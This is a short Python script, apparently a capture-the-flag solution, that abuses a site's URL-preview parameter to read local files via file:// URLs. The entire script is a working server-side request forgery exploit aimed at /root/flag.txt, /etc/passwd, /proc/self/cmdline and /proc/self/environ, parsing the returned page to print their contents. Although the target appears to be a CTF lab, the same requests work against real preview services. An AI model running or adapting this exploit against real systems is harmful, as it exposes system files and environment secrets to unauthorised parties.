import urllib.request
import urllib.parse
import re

BASE = 'https://991c635b-ctf.dsg.id/'
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

def fetch(target_url):
    url = BASE + '?url=' + urllib.parse.quote(target_url)
    req = urllib.request.Request(url, headers={'User-Agent': UA})
    try:
        res = urllib.request.urlopen(req)
        html = res.read().decode()
        # Extract preview-content div
        m = re.search(r'class="preview-content">(.*?)</div>', html, re.DOTALL)
        if m:
            return 'PREVIEW: ' + m.group(1).strip()[:1000]
        m = re.search(r'class="error-msg">(.*?)</div>', html, re.DOTALL)
        if m:
            return 'ERROR: ' + m.group(1).strip()
        return 'RAW: ' + html[-500:]
    except Exception as e:
        return f'EXCEPTION: {e}'

urls = [
    'file:///root/flag.txt',
    'file:///etc/passwd',
    'file:///proc/self/cmdline',
    'file:///proc/self/environ',
]

for u in urls:
    print(f'=== {u} ===')
    print(fetch(u))
    print()
